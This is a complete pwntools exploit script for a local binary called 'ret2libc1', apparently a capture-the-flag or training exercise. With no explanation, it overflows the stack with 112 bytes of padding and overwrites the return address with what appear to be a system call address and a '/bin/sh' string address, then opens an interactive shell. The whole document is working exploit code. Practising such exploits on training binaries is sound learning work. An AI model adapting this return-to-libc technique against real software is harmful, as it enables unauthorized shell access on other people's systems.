from pwn import *
p = process("./ret2libc1")

payload = 'a'*112 + p32(0x08048460) + p32(0x0) + p32(0x08048720)
p.sendline(payload)
p.interactive()
